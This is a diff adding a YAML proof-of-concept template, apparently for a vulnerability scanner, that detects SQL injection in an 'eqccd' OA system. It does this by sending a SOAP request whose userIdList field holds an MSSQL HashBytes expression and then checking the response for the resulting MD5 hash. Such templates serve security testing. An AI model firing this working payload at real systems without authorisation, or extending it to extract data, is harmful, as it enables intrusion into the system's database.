@@ -1,0 +1,30 @@
+name: yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760
+binding: 1f2fa96b-662c-454d-8412-160bf5a14fdd
+detail:
+    author: system_user
+    vulnerability:
+        id: 5e84e916-cf52-4edc-9199-219cb1c89d1d
+        level: high
+transport: http
+set:
+    r1: randomInt(2000000, 4000000)
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /OA/PM/svc.asmx
+            headers:
+                Content-Type: text/xml
+            body: |-
+                <?xml version="1.0" encoding="utf-8"?>
+                <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+                  <soap:Body>
+                    <GetUsersInfo xmlns="http://tempuri.org/">
+                      <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{r1}}'),2))</userIdList>
+                    </GetUsersInfo>
+                  </soap:Body>
+                </soap:Envelope>
+            follow_redirects: false
+        expression: response.status == 500 && response.body.bcontains(bytes(md5(string(r1))))
+expression: r1()
